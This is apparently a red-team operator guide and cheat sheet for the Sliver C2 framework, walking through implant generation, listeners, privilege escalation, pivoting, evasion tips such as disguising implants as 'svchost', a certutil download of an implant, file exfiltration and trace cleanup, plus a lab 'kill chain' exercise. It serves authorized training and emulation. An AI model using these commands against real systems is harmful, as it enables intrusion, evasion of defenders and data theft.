---
tags: [redteam, c2, sliver, cheatsheet, guide]
date: 2026-04-22
author: clawd
---

# Sliver C2 — Red Team Operator Guide

> [!danger] Disclaimer
> This guide is for **authorized lab practice and educational purposes only**. Unauthorized access to computer systems is illegal. Always obtain written permission before conducting any red team engagement or penetration test. The authors assume no liability for misuse.

> [!info] Related Guides
> This guide is part of the **Cyber Exercise** vault. See also:
> - [[Network Enumeration Guide]] — systematic recon and enumeration procedures
> - [[Metasploit 101]] — exploitation framework for initial access and post-exploitation
> - [[Red Team Engagement Guide]] — full engagement lifecycle and methodology

---

## 1. Overview

**Sliver** is an open-source cross-platform adversary emulation / C2 framework created by Bishop Fox. It's designed for red team operations, penetration testing, and adversary simulation.

### Why Sliver?

| Feature | Benefit |
|---------|---------|
| Open-source | Full transparency, community-driven, free |
| Cross-platform | Windows, Linux, macOS implants |
| Multiplayer | Multiple operators collaborate on one server |
| Extensible | Armory package manager for community modules |
| Multiple protocols | HTTP(S), DNS, WireGuard, mTLS, named pipes |
| Beacon + Session | Flexible real-time and asynchronous C2 |
| DNAT/redirector support | Built for operational infrastructure |
| Active development | Regular updates, modern codebase (Go) |

### Architecture

```
┌──────────────────────────────────────────────┐
│                Sliver Server                  │
│  ┌──────────┐  ┌───────────┐  ┌──────────┐ │
│  │Listeners │  │  Implant   │  │ Multiplay │ │
│  │(Jobs)    │  │  Generator │  │   Server  │ │
│  └──────────┘  └───────────┘  └──────────┘ │
│         ▲                               ▲     │
└─────────┼───────────────────────────────┼─────┘
          │                               │
    ┌─────┴─────┐                   ┌─────┴─────┐
    │  Implant   │                   │  Client    │
    │ (on Target)│                   │(Operator)  │
    └───────────┘                   └───────────┘
```

- **Server** — The C2 hub. Manages listeners, generates implants, stores loot/creds, hosts multiplayer.
- **Client** — The operator's CLI interface. Connects to the server via mutual TLS (mTLS). Multiple clients can connect simultaneously.
- **Implant** — The compiled binary deployed to the [[Target]]. Calls back to the server via configured protocol(s).

> [!tip] Key Distinction
> Sliver separates the **server** (runs on your infra) from the **client** (runs on your operator machine). Implants connect to the server, not the client.

---

## 2. Installation & Setup

### Server Install

```bash
# Official install script (Linux/macOS)
curl -sL https://sliver.sh/install | bash

# Or via Go install
go install github.com/bishopfox/sliver/server/cmd/sliver-server@latest

# Or download binary from GitHub releases
# https://github.com/BishopFox/sliver/releases
```

### Starting the Server

```bash
# First run — generates operator configs, certificates, etc.
sliver-server

# Daemon mode (recommended for persistent ops)
sliver-server daemon

# The server listens on:
# - 1337 (gRPC — multiplayer client connections)
# - 1338 (gRPC over WireGuard)
# - 31337 (default HTTP listener port — configurable)
```

> [!note] Server Data
> Sliver stores its data in `~/.sliver/` by default. This includes certificates, implant configurations, loot, and session databases.

### Client Setup

```bash
# Install the client
curl -sL https://sliver.sh/install | bash

# Generate a client config from the server
sliver-server operator --name agustin --lhost <SERVER_IP> --save /path/to/

# This creates a ~/.sliver-client/<name>.cfg file
# Copy it to your operator machine

# Connect to the server
sliver import <name>.cfg      # Import the config
sliver                         # Connect using imported config
```

### Generating Configs

```bash
# On the server, generate configs for additional operators
sliver-server operator --name operator2 --lhost 10.10.10.10 --save ./configs/

# For WireGuard-based multiplayer
sliver-server operator --name wg-op --lhost 10.10.10.10 --lport 1338 --save ./configs/
```

> [!warning] Config Security
> Operator configs contain mTLS certificates. Treat them like private keys — never commit to version control, never transmit over unencrypted channels.

---

## 3. Core Concepts

### Sessions vs. Beacons

| Aspect | Session (Interactive) | Beacon (Asynchronous) |
|--------|----------------------|----------------------|
| Connection | Persistent TCP | Polling (interval-based) |
| Real-time | ✅ Yes | ❌ No (delayed) |
| Stability | Fails on disconnect | Resilient — re-polls |
| Detection | More visible | Less visible (low & slow) |
| Use case | Active exploitation, pivoting | Long-term persistence, stealth |
| Command | `sessions` | `beacons` |
| Interact | `use <id>` | `use <id>` |

```sliver
# Session mode — real-time interaction
generate --name session-implant --http <SERVER_IP> --format exe

# Beacon mode — asynchronous polling (every 60s)
generate --name beacon-implant --http <SERVER_IP> --format exe --beacon

# Convert between modes
beacon-to-session <beacon-id>
session-to-beacon <session-id>
```

> [!tip] Operational Guidance
> Use **beacons** for long-haul operations and OPSEC-sensitive environments. Use **sessions** when you need real-time interaction (e.g., pivoting, interactive shells). Switch modes as needed.

### Operators

Operators are authorized users who can connect to the Sliver server. Each gets a unique mTLS certificate.

```sliver
# Multiplayer management (in client)
multiplayer          # Show multiplayer server info
operators            # List connected operators
```

### Profiles

Profiles are reusable implant configurations — they predefine transport, format, and other options so you don't have to type them every time.

```sliver
profiles new --name windows-http --http <SERVER_IP> --format exe --mtls <SERVER_IP>
profiles new --name linux-dns --dns <SERVER_IP> --format elf
profiles new --name stealth-beacon --http <SERVER_IP> --beacon 120 --format shellcode
```

### Listeners & Jobs

- **Listener** — A protocol handler waiting for implant callbacks (e.g., HTTP on port 80).
- **Job** — A running listener instance. The server runs listeners as "jobs."

```sliver
# Start an HTTP listener
http --lhost 0.0.0.0 --lport 80

# Start an HTTPS listener
https --lhost 0.0.0.0 --lport 443 --cert ./cert.pem --key ./key.pem

# Start a DNS listener
dns --domains c2.example.com --lhost 0.0.0.0

# Start a WireGuard listener
wg --lhost 0.0.0.0 --lport 53

# Start mTLS listener
mtls --lhost 0.0.0.0 --lport 4443

# View running jobs
jobs

# Kill a job
jobs kill <job-id>
```

---

## 4. Quick Start Workflow

> [!note] Scenario
> You have a Sliver server at `10.10.10.10` and want to get a session on a Windows target in your lab.

### Step-by-Step: First Session

```bash
# 1. Start the Sliver server (on your C2 server)
sliver-server daemon
```

```bash
# 2. Generate an operator config and connect
sliver-server operator --name agustin --lhost 10.10.10.10 --save ./
sliver import agustin.cfg
sliver
```

```sliver
# 3. Inside the Sliver client, start a listener
sliver > http --lhost 10.10.10.10 --lport 80

[*] Job 1 (http) started

# 4. Generate an implant
sliver > generate --name first-implant --http 10.10.10.10 --format exe

[*] Generating new windows/amd64 implant binary
[*] Build completed, output: /home/agustin/.sliver/outputs/first-implant.exe

# 5. Serve the implant for download
sliver > websites

# Or just copy it from the output path
# Transfer to target using your preferred method

# 6. Execute on target (your lab target)
# On the Windows target:
first-implant.exe

# 7. Back in Sliver — you'll see:
# [+] Session 1 BOF_FANCY_BEACON - 192.168.1.50:49812 (DESKTOP-LAB) - windows/amd64

# 8. Interact with the session
sliver > use 1

[*] Active session BOF_FANCY_BEACON (1)

sliver (BOF_FANCY_BEACON) > whoami
LAB\agustin

sliver (BOF_FANCY_BEACON) > getuid
LAB\agustin

sliver (BOF_FANCY_BEACON) > ps
# ... process listing ...

sliver (BOF_FANCY_BEACON) > shell whoami
# ... interactive shell command ...

sliver (BOF_FANCY_BEACON) > background
# Return to main menu
```

> [!tip] Transfer Methods
> For lab practice, common implant transfer methods include:
> - **Python HTTP server**: `python3 -m http.server 8000` on your server
> - **Sliver's hosted payload**: Use `profiles` + `http` listener to serve directly
> - **SMB share**: For air-gapped or restricted networks
> - **Certutil**: `certutil -urlcache -split -f http://10.10.10.10/implant.exe implant.exe` (Windows)

---

## 5. Most Used Commands

### Session & Beacon Management

```sliver
# List all active sessions
sessions

# List all active beacons
beacons

# Interact with a session/beacon by ID
use 1

# Interact by name
use BOF_FANCY_BEACON

# Background the current session
background

# Kill a session
kill <session-id>

# Convert beacon to interactive session
beacon-to-session <beacon-id>

# Convert session to beacon
session-to-beacon <session-id>
```

### Implant Generation

```sliver
# Basic HTTP implant (Windows EXE)
generate --name my-implant --http 10.10.10.10 --format exe

# HTTPS implant with mTLS fallback
generate --name secure-implant --https 10.10.10.10 --mtls 10.10.10.10 --format exe

# DNS implant (Linux ELF)
generate --name dns-implant --dns c2.example.com --format elf

# Beacon-mode implant (polls every 60 seconds)
generate --name stealth-implant --http 10.10.10.10 --beacon 60 --format exe

# WireGuard implant
generate --name wg-implant --wg 10.10.10.10 --format exe

# Shellcode format (for injection)
generate --name shellcode-implant --http 10.10.10.10 --format shellcode

# DLL format
generate --name dll-implant --http 10.10.10.10 --format dll

# Service format (for privilege escalation)
generate --name svc-implant --http 10.10.10.10 --format service

# With specific architecture
generate --name x86-implant --http 10.10.10.10 --format exe --arch 386
```

### Profiles

```sliver
# Create a new profile
profiles new --name win-http --http 10.10.10.10 --format exe
profiles new --name lin-dns --dns c2.example.com --format elf --arch amd64

# List all profiles
profiles

# Generate an implant from a profile
profiles generate --name win-http

# Remove a profile
profiles rm win-http
```

### Implant Management

```sliver
# List previously generated implants
implants

# List implant build logs
implants --verbose

# Regenerate an implant from history
regenerate --name my-implant
```

### Listeners & Jobs

```sliver
# Start listeners
http --lhost 0.0.0.0 --lport 80
https --lhost 0.0.0.0 --lport 443 --cert ./server.pem --key ./server-key.pem
dns --domains c2.example.com --lhost 0.0.0.0
mtls --lhost 0.0.0.0 --lport 4443
wg --lhost 0.0.0.0 --lport 53

# List running jobs
jobs

# Kill a job
jobs kill <job-id>
```

### Multiplayer

```sliver
# Connect to a multiplayer server (from client)
multiplayer --lhost 10.10.10.10 --lport 1337 --name agustin

# List connected operators
operators
```

### Shell & Command Execution

```sliver
# Execute a command via the implant (non-interactive)
shell whoami
shell ipconfig /all
shell net user

# Execute a binary on the target
execute C:\Windows\System32\cmd.exe /c whoami
execute /bin/bash -c "id"

# Interactive shell (opens a proper shell)
interactive
```

> [!warning] Shell vs Execute
> `shell` uses Sliver's built-in command execution (less OPSEC risk). `execute` runs an actual binary on the target and may trigger EDR. Prefer `shell` for simple commands.

### File Operations

```sliver
# Upload a file to the target
upload /local/path/tool.exe C:\Users\Public\tool.exe
upload ./exploit.py /tmp/exploit.py

# Download a file from the target
download C:\Users\agustin\Documents\secret.docx
download /etc/passwd

# List directory contents
ls C:\Users\
ls /etc/

# Change directory
cd C:\Users\Public
cd /tmp

# Read a file
cat C:\Users\agutron\Desktop\notes.txt
cat /etc/hosts

# Create directory
mkdir C:\Users\Public\tools
mkdir /tmp/sliver-work

# Remove a file
rm C:\Users\Public\tool.exe
rm /tmp/exploit.py
```

### Process Management

```sliver
# List running processes
ps

# Get current process info
getpid

# Get current user
getuid

# Migrate to another process (post-exploitation staple)
migrate <pid>

# Elevate to SYSTEM (Windows)
getsystem

# Kill a process
kill <pid>

# Terminate the implant itself
die
```

### Network Reconnaissance

```sliver
# Network interfaces
ifconfig

# Network connections
netstat

# Ping sweep
ping 192.168.1.1
ping 10.0.0.0/24

# Resolve DNS
resolve google.com

# Port scanning (via armory extension)
# See armory section below
```

### Pivoting & Tunneling

```sliver
# Port forwarding — forward a local port through the implant
portfwd add --remote --bind 127.0.0.1:8888 --forward 192.168.1.50:80

# List active port forwards
portfwd

# Remove a port forward
portfwd remove <id>

# SOCKS5 proxy — create a SOCKS5 proxy through the implant
socks5 --bind 127.0.0.1:1080

# SSH through the implant
ssh --user root --password <pass> 192.168.1.50

# SSH with key
ssh --user root --priv-key /path/to/key 192.168.1.50
```

### Post-Exploitation

```sliver
# Screenshot (Windows/macOS)
screenshot

# Capture keystrokes (use with caution — lab only)
# Requires armory extension

# Dump credentials
creds

# Manage loot
loot
loot add --name "hashes.txt" --type hash /path/to/file
loot remove <loot-id>

# Information gathering
whoami
getuid
getpid
```

### Transport Configuration

```sliver
# HTTP transport (in generate command)
generate --http 10.10.10.10:80 ...

# HTTPS transport (with custom cert)
generate --https 10.10.10.10:443 ...

# DNS transport
generate --dns c2.example.com ...

# mTLS transport (mutual TLS — most secure)
generate --mtls 10.10.10.10:4443 ...

# WireGuard transport (encrypted tunnel)
generate --wg 10.10.10.10 ...

# Multi-transport (fallback)
generate --http 10.10.10.10 --mtls 10.10.10.10:4443 --dns c2.example.com ...
```

> [!tip] Multi-Transport
> Always generate implants with at least one fallback C2 channel. If the primary listener goes down, the implant will rotate to the next configured transport.

### Armory (Extensions & Packages)

```sliver
# Update the armory index
armory update

# List available packages
armory search
armory search <keyword>

# Install a package
armory install <package-name>

# Common armory packages:
armory install scatterer      # Lateral movement
armory install chisel         # SOCKS proxy
armory install rubeus         # Kerberos attacks
armory install sharphound     # BloodHound collector
armory install nmap           # Port scanning
armory install seatbelt       # Situational awareness
armory install sherlock       # Privilege escalation finder
armory install Watson         # Privilege escalation

# List installed packages
armory installed

# Run an armory extension
# Usage varies by package — check docs
execute-extension <package-name>
```

---

## 6. Cheat Sheet

### Session & Beacon Commands

| Command | Description | Example |
|---------|-------------|---------|
| `sessions` | List active sessions | `sessions` |
| `beacons` | List active beacons | `beacons` |
| `use <id>` | Interact with session/beacon | `use 1` |
| `background` | Return to main menu | `background` |
| `kill <id>` | Kill session/beacon | `kill 1` |
| `beacon-to-session` | Promote beacon to session | `beacon-to-session ABC123` |
| `session-to-beacon` | Demote session to beacon | `session-to-beacon 1` |

### Generation Commands

| Command | Description | Example |
|---------|-------------|---------|
| `generate` | Create new implant | `generate --http 10.0.0.1 --format exe` |
| `profiles new` | Create implant profile | `profiles new --name win --http 10.0.0.1 --format exe` |
| `profiles generate` | Build from profile | `profiles generate --name win` |
| `implants` | List generated implants | `implants` |
| `regenerate` | Rebuild a previous implant | `regenerate --name my-implant` |

### Listener Commands

| Command | Description | Example |
|---------|-------------|---------|
| `http` | Start HTTP listener | `http --lhost 0.0.0.0 --lport 80` |
| `https` | Start HTTPS listener | `https --lhost 0.0.0.0 --lport 443` |
| `dns` | Start DNS listener | `dns --domains c2.example.com` |
| `mtls` | Start mTLS listener | `mtls --lhost 0.0.0.0 --lport 4443` |
| `wg` | Start WireGuard listener | `wg --lhost 0.0.0.0 --lport 53` |
| `jobs` | List running listeners | `jobs` |
| `jobs kill <id>` | Stop a listener | `jobs kill 1` |

### File Commands

| Command | Description | Example |
|---------|-------------|---------|
| `upload` | Upload file to target | `upload ./tool.exe C:\Users\Public\tool.exe` |
| `download` | Download file from target | `download C:\Users\Public\hashes.txt` |
| `ls` | List directory | `ls C:\Windows\Temp` |
| `cd` | Change directory | `cd /tmp` |
| `cat` | Read file contents | `cat /etc/passwd` |
| `rm` | Remove file | `rm C:\Users\Public\tool.exe` |
| `mkdir` | Create directory | `mkdir C:\Users\Public\tools` |

### Recon Commands

| Command | Description | Example |
|---------|-------------|---------|
| `ps` | List processes | `ps` |
| `ifconfig` | Network interfaces | `ifconfig` |
| `netstat` | Network connections | `netstat` |
| `ping` | Ping host | `ping 192.168.1.1` |
| `resolve` | DNS lookup | `resolve target.local` |
| `whoami` | Current username | `whoami` |
| `getuid` | Get user ID | `getuid` |
| `getpid` | Get implant PID | `getpid` |

### Post-Exploitation Commands

| Command | Description | Example |
|---------|-------------|---------|
| `shell` | Execute shell command | `shell whoami` |
| `execute` | Run binary on target | `execute cmd.exe /c whoami` |
| `interactive` | Open interactive shell | `interactive` |
| `migrate` | Migrate to process | `migrate 1234` |
| `getsystem` | Elevate to SYSTEM | `getsystem` |
| `screenshot` | Capture screenshot | `screenshot` |
| `kill` | Kill a process | `kill 1234` |
| `die` | Terminate implant | `die` |
| `creds` | View stored credentials | `creds` |
| `loot` | Manage looted files | `loot` |

### Pivoting Commands

| Command | Description | Example |
|---------|-------------|---------|
| `portfwd add` | Add port forward | `portfwd add --bind 127.0.0.1:8888 --forward 10.0.0.5:80` |
| `portfwd` | List port forwards | `portfwd` |
| `portfwd remove` | Remove port forward | `portfwd remove 1` |
| `socks5` | Start SOCKS5 proxy | `socks5 --bind 127.0.0.1:1080` |
| `ssh` | SSH through implant | `ssh --user root --password pass 10.0.0.5` |

### Implant Formats

| Format | Flag | Use Case |
|--------|------|----------|
| Windows EXE | `--format exe` | Standalone executable |
| Windows DLL | `--format dll` | DLL sideloading |
| Windows Service | `--format service` | Service installation |
| Shellcode | `--format shellcode` | Injection / exploit payload |
| Linux ELF | `--format elf` | Standalone Linux binary |
| macOS Mach-O | `--format macho` | Standalone macOS binary |

---

## 7. Profiles & Implant Generation

### Creating Profiles

Profiles save you from retyping long `generate` commands. Define your implant config once, rebuild anytime.

```sliver
# HTTP Windows profile
profiles new --name win-http --http 10.10.10.10 --format exe --arch amd64

# HTTPS with mTLS fallback
profiles new --name win-secure --https 10.10.10.10 --mtls 10.10.10.10:4443 --format exe

# DNS beacon (low & slow)
profiles new --name lin-dns-beacon --dns c2.example.com --beacon 120 --format elf

# Multi-protocol with custom interval
profiles new --name stealth-win \
  --http 10.10.10.10 \
  --dns c2.example.com \
  --beacon 60 \
  --jitter 10 \
  --format exe

# WireGuard profile
profiles new --name wg-tunnel --wg 10.10.10.10 --format exe
```

### Generating from Profiles

```sliver
# List profiles
profiles

# Generate an implant from a profile
profiles generate --name win-http

# Output goes to ~/.sliver/outputs/
```

### Advanced Generation Options

```sliver
# Custom binary name (OPSEC — avoid suspicious names)
generate --name svchost --http 10.10.10.10 --format exe

# Evasion options
generate --name evasive --http 10.10.10.10 --format exe \
  --skip-symbols \
  --evasion

# Disable service indicators
generate --name clean --http 10.10.10.10 --format exe \
  --skip-symbols

# Custom C2 interval and jitter (beacons)
generate --name slow-beacon --http 10.10.10.10 --beacon 300 --jitter 30 --format exe

# Debug mode (for lab — more verbose output)
generate --name debug-implant --http 10.10.10.10 --format exe --debug

# Limit max connection errors before implant exits
generate --name resilient --http 10.10.10.10 --max-errors 50 --format exe
```

### Implant Naming Convention

> [!tip] OPSEC Tip
> Use randomized or blend-in names for implants. Sliver generates random codenames by default (e.g., `TANGY_HORIZON`), but you can override:

```sliver
# Random codename (default)
generate --http 10.10.10.10 --format exe

# Custom name (use something that blends in)
generate --name svchost --http 10.10.10.10 --format exe
generate --name update --http 10.10.10.10 --format exe
```

---

## 8. Listener Types

### Comparison Table

| Listener | Protocol | Stealth | Reliability | Use Case |
|----------|----------|---------|-------------|----------|
| **HTTP** | TCP/HTTP | ⭐⭐⭐ | ⭐⭐⭐⭐ | Default C2, easy to set up, works through proxies |
| **HTTPS** | TCP/HTTPS | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | Encrypted C2, blends with web traffic |
| **DNS** | UDP/DNS | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ | Highly evasive, works behind restrictive firewalls |
| **mTLS** | TCP/TLS | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | Secure operator→server, most reliable |
| **WireGuard** | UDP/WG | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | Encrypted tunnel, great for pivoting |
| **Named Pipe** | SMB pipe | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ | LAN-only, no network indicators, lateral movement |

### HTTP Listener

```sliver
# Basic HTTP listener
http --lhost 0.0.0.0 --lport 80

# With custom domain (for redirector setups)
http --lhost 0.0.0.0 --lport 80 --domain c2.example.com
```

> [!tip] Redirectors
> In real ops, never expose your Sliver server directly. Place a redirector (Nginx/Caddy/Apache) in front. Point DNS to redirector → redirector forwards to Sliver.

### HTTPS Listener

```sliver
# HTTPS with custom certs (recommended)
https --lhost 0.0.0.0 --lport 443 --cert ./cert.pem --key ./key.pem

# With long domain for domain fronting
https --lhost 0.0.0.0 --lport 443 --domain cdn.example.com
```

### DNS Listener

```sliver
# DNS C2 — requires domain delegation
dns --domains c2.example.com --lhost 0.0.0.0

# Configure your DNS zone:
# c2.example.com NS → your-sliver-server
# The server responds to DNS queries from implants
```

> [!warning] DNS Setup
> DNS C2 requires proper NS record delegation. Create an NS record pointing `c2.example.com` to your Sliver server's hostname, then add an A record for that hostname. This is not plug-and-play like HTTP.

### WireGuard Listener

```sliver
# Start WireGuard listener
wg --lhost 0.0.0.0 --lport 53

# Generate an implant that uses WireGuard
generate --name wg-implant --wg 10.10.10.10 --format exe

# WireGuard creates an encrypted tunnel — excellent for:
# - Evading deep packet inspection
# - Full tunneling / pivoting
# - C2 that looks like VPN traffic
```

### mTLS Listener

```sliver
# Mutual TLS — both sides verify certificates
mtls --lhost 0.0.0.0 --lport 4443

# Generate implant with mTLS
generate --name mtls-implant --mtls 10.10.10.10:4443 --format exe

# Primary use: operator→server connections and reliable C2
```

### Named Pipe Listener

```sliver
# Named pipe — SMB-based, LAN-only
named-pipe --name sliver_pipe

# Implants connect via SMB pipe — no network traffic leaves the LAN
# Excellent for lateral movement within a domain
```

---

## 9. OPSEC Considerations

> [!danger] Lab Only
> The techniques below are for authorized red team engagements and lab practice. Misuse is illegal.

### Implant OPSEC

| Concern | Mitigation |
|---------|------------|
| **Default implant names** | Use `--name` with blend-in names like `update` or `svchost` |
| **Command-line artifacts** | Use `--skip-symbols` to strip debug symbols |
| **Binary signatures** | Regenerate implants between ops; unique compile signatures |
| **Memory artifacts** | Consider `--evasion` flag; test against target EDR |
| **Disk artifacts** | Use `rm` to clean up; avoid writing to disk when possible |
| **Network patterns** | Vary beacon intervals with `--jitter`; use DNS or WG for stealth |

### Infrastructure OPSEC

```sliver
# 1. Never expose Sliver server directly — use redirectors
# Redirector (Nginx example):
# server { listen 443; location / { proxy_pass http://SLIVER_IP:80; } }

# 2. Use domain fronting (HTTPS with CDN)
generate --https cdn.example.com --format exe

# 3. Rotate infrastructure
# - Use multiple redirectors
# - Rotate DNS records between engagements
# - Burn C2 domains after detection

# 4. Enable DNS fallback
generate --http 10.10.10.10 --dns c2.example.com --format exe

# 5. WireGuard for encrypted C2
generate --wg 10.10.10.10 --format exe
```

### Detection Avoidance

```sliver
# Slow beacon interval (OPSEC-friendly)
generate --name slow --http 10.10.10.10 --beacon 300 --jitter 30 --format exe

# Jitter adds randomness to callbacks (percentage)
# --beacon 300 --jitter 30  →  callbacks every 210-390 seconds

# Use DNS for low-and-slow operations
generate --name dns-slow --dns c2.example.com --beacon 600 --jitter 50 --format exe
```

### Cleanup

```sliver
# On the implant, before disconnecting:
rm C:\Users\Public\tool.exe          # Remove dropped tools
rm C:\Windows\Temp\implant.exe        # Remove the implant binary

# Kill the implant cleanly
die                                    # Self-terminate

# On the server:
jobs kill <job-id>                     # Stop listeners
implants --verbose                      # Review generated implants
loot                                    # Review exfiltrated data
```

### Logging

```bash
# Sliver logs everything by default
# Check logs in: ~/.sliver/logs/

# Event logs contain:
# - Session connections/disconnections
# - Command history
# - File transfers

# Disable debug logging in production ops
generate --name prod --http 10.10.10.10 --format exe  # No --debug flag

# For lab practice, enable debug for troubleshooting
generate --name debug-implant --http 10.10.10.10 --format exe --debug
```

---

## 10. Troubleshooting

### Common Issues & Fixes

#### Implant Not Calling Back

```bash
# 1. Check if the listener is running
jobs

# 2. Verify the listener is on the correct interface/port
# The implant must be able to reach the listener IP

# 3. Check firewall on C2 server
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw allow 4443/tcp

# 4. Verify DNS records (for DNS C2)
dig c2.example.com A
dig c2.example.com NS

# 5. Test connectivity from target
ping 10.10.10.10
curl http://10.10.10.10  # If HTTP listener
```

#### Server Won't Start

```bash
# Check if port is already in use
sudo lsof -i :31337
sudo lsof -i :1337

# Kill stale processes
kill -9 <pid>

# Clear and restart (nuclear option — loses all data)
rm -rf ~/.sliver/
sliver-server  # Re-initialize
```

#### Client Connection Failed

```bash
# Verify operator config is valid
cat ~/.sliver-client/<name>.cfg

# Check server is reachable
nc -zv <server-ip> 1337

# Regenerate operator config
sliver-server operator --name agustin --lhost <SERVER_IP> --save ./

# Re-import
sliver import agustin.cfg
```

#### mTLS Certificate Errors

```bash
# Regenerate certificates
rm ~/.sliver/ca.crt ~/.sliver/ca.key
sliver-server  # Auto-regenerates on next start

# Re-generate operator configs after cert regeneration
sliver-server operator --name agustin --lhost <SERVER_IP> --save ./
```

#### Armory Install Fails

```sliver
# Update the armory index
armory update

# If packages fail to download, check network connectivity
# Armory uses GitHub releases

# Install specific version
armory install <package>@<version>
```

#### "Session Closed Immediately"

```bash
# Common causes:
# 1. Implant detected and killed by AV/EDR
# 2. Target host lost connectivity
# 3. Firewall blocked callback

# Check with debug implant
generate --name debug-implant --http 10.10.10.10 --format exe --debug

# Review server logs
tail -f ~/.sliver/logs/sliver.log
```

> [!tip] Debug Mode
> When troubleshooting, always generate implants with `--debug`. This gives verbose output on the target side, helping you identify connection issues.

---

## 11. Practice Mission Scenario

> [!note] Lab Exercise
> This is a CTF-style exercise for your lab environment. Do NOT attempt on systems you don't own.

### Mission: "Operation Shadow Reach"

**Objective**: Compromise a Windows target, escalate privileges, pivot to an internal Linux server, and exfiltrate a flag file.

**Lab Setup**:
- Sliver server: `10.10.10.10` (your C2)
- Target 1 (Windows): `192.168.1.50` (direct access)
- Target 2 (Linux): `192.168.1.100` (internal, only reachable from Target 1)

#### Phase 1: Initial Access

```sliver
# Start listeners
sliver > http --lhost 10.10.10.10 --lport 80
sliver > dns --domains c2.lab.local --lhost 10.10.10.10

# Generate implant for Windows
sliver > generate --name shadow-win --http 10.10.10.10 --dns c2.lab.local --format exe --arch amd64

# Transfer to Target 1 using your preferred method
# Execute on Target 1

# Verify session
sliver > sessions
# [+] Session 1 SHADOW_WIN - 192.168.1.50:49812 (DESKTOP-LAB) - windows/amd64
```

#### Phase 2: Reconnaissance

```sliver
sliver > use 1

# Who are we?
sliver (SHADOW_WIN) > whoami
sliver (SHADOW_WIN) > getuid

# What's the system?
sliver (SHADOW_WIN) > shell systeminfo

# Network layout
sliver (SHADOW_WIN) > ifconfig
sliver (SHADOW_WIN) > netstat
sliver (SHADOW_WIN) > ps

# Check for interesting files
sliver (SHADOW_WIN) > ls C:\Users\
sliver (SHADOW_WIN) > cat C:\Users\Public\notes.txt
```

#### Phase 3: Privilege Escalation

```sliver
# Try getsystem (if running as admin-level user)
sliver (SHADOW_WIN) > getsystem

# If not admin, look for escalation paths
sliver (SHADOW_WIN) > shell whoami /priv

# Install and run privilege escalation checker
sliver (SHADOW_WIN) > armory install watson
sliver (SHADOW_WIN) > execute-extension watson

# After escalating, migrate to a stable process
sliver (SHADOW_WIN) > ps
sliver (SHADOW_WIN) > migrate <explorer.exe-pid>
```

#### Phase 4: Lateral Movement & Pivoting

```sliver
# Set up a SOCKS5 proxy through Target 1
sliver (SHADOW_WIN) > socks5 --bind 127.0.0.1:1080

# Now use the SOCKS5 proxy to reach Target 2
# In another terminal:
# proxychains ssh user@192.168.1.100

# Or use Sliver's built-in SSH
sliver (SHADOW_WIN) > ssh --user labuser --password labpass 192.168.1.100

# Or port-forward directly
sliver (SHADOW_WIN) > portfwd add --bind 127.0.0.1:2222 --forward 192.168.1.100:22

# Generate a Linux implant for Target 2
sliver > generate --name shadow-lin --http 10.10.10.10 --format elf --arch amd64

# Upload and execute on Target 2 (via SSH or proxy)
sliver (SHADOW_WIN) > upload /path/to/shadow-lin /tmp/shadow-lin
# SSH to Target 2 and execute
```

#### Phase 5: Exfiltration

```sliver
# Find the flag
sliver (SHADOW_WIN) > ls C:\Users\Administrator\Desktop\
# Or on Linux target:
sliver > use 2
sliver (SHADOW_LIN) > ls /root/
sliver (SHADOW_LIN) > cat /root/flag.txt

# Download the flag
sliver (SHADOW_LIN) > download /root/flag.txt

# Store in loot
sliver > loot add --name "flag.txt" --type document ~/.sliver/downloads/flag.txt

# Verify
sliver > loot
```

#### Phase 6: Cleanup

```sliver
# Remove tools and implants from targets
sliver (SHADOW_WIN) > rm C:\Users\Public\shadow-win.exe
sliver (SHADOW_WIN) > rm C:\Users\Public\tools\*

# Kill the implants cleanly
sliver (SHADOW_WIN) > die
sliver (SHADOW_LIN) > die

# Stop Sliver listeners
sliver > jobs
sliver > jobs kill 1
sliver > jobs kill 2

# Review what you left behind
sliver > loot
sliver > creds
```

> [!success] Mission Complete
> You've practiced the full kill chain: initial access → recon → privilege escalation → lateral movement → exfiltration → cleanup. Review your OPSEC: were there any artifacts left? Could the C2 traffic have been detected? These are the questions that matter in real engagements.

---

## Quick Reference Card

```
┌─────────────────────────────────────────────────────────────┐
│                    SLIVER C2 QUICK REF                      │
├─────────────────────────────────────────────────────────────┤
│ Start/Connect                                               │
│  sliver-server daemon   # Start server                     │
│  sliver                 # Connect client                    │
├─────────────────────────────────────────────────────────────┤
│ Listeners                                                   │
│  http  --lhost 0.0.0.0 --lport 80                          │
│  https --lhost 0.0.0.0 --lport 443 --cert x --key y        │
│  dns   --domains c2.example.com --lhost 0.0.0.0             │
│  mtls  --lhost 0.0.0.0 --lport 4443                         │
│  wg    --lhost 0.0.0.0 --lport 53                           │
│  jobs                  # List listeners                     │
│  jobs kill <id>        # Stop listener                      │
├─────────────────────────────────────────────────────────────┤
│ Implants                                                    │
│  generate --http IP --format exe        # Windows EXE      │
│  generate --dns DOMAIN --format elf      # Linux DNS        │
│  generate --wg IP --format shellcode     # WG shellcode     │
│  generate --http IP --beacon 60          # Beacon mode      │
│  profiles new / generate                # Profile mgmt     │
│  implants                               # List builds       │
├─────────────────────────────────────────────────────────────┤
│ Interaction                                                 │
│  sessions / beacons   # List active                        │
│  use <id>             # Interact                           │
│  background           # Return to menu                     │
│  shell <cmd>          # Run shell command                  │
│  upload / download    # File transfer                      │
│  ps / ifconfig / netstat  # Recon                          │
│  migrate <pid>        # Process migration                  │
│  getsystem            # Escalate to SYSTEM                 │
│  screenshot           # Grab screenshot                    │
├─────────────────────────────────────────────────────────────┤
│ Pivoting                                                    │
│  socks5 --bind 127.0.0.1:1080                              │
│  portfwd add --bind L:P --forward R:P                      │
│  ssh --user U --password P <host>                          │
├─────────────────────────────────────────────────────────────┤
│ OPSEC                                                       │
│  --beacon N --jitter M    # Slow C2                        │
│  --skip-symbols           # Strip symbols                   │
│  --evasion                # Evasion flags                   │
│  die                      # Self-terminate                  │
│  rm <path>                # Clean up files                  │
├─────────────────────────────────────────────────────────────┤
│ Extensions                                                  │
│  armory update            # Update index                    │
│  armory search <term>     # Find packages                  │
│  armory install <pkg>     # Install package                │
└─────────────────────────────────────────────────────────────┘
```

---

*Guide generated by clawd 🦞 — Last updated: 2026-04-22*
